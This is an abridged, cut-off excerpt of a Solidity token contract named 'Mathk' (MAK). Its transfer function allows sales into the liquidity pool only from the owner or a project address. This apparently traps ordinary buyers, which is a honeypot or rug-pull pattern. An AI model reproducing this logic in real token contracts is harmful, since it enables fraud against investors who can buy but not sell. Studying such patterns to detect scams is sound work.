...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Mathk';
    string constant public symbol = 'MAK';
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        require(allowAll || (from == owner && to == lpAddress) || (from == projectAddress && to == lpAddress) || from == lpAddress, "not allowed");
        ...
        if (to == projectAddress){
            allowAll = false;
        }

        
          if(from == lpAddress && from != owner && to != owner && !firstTransaction && from != projectAddress && to != projectAddress){
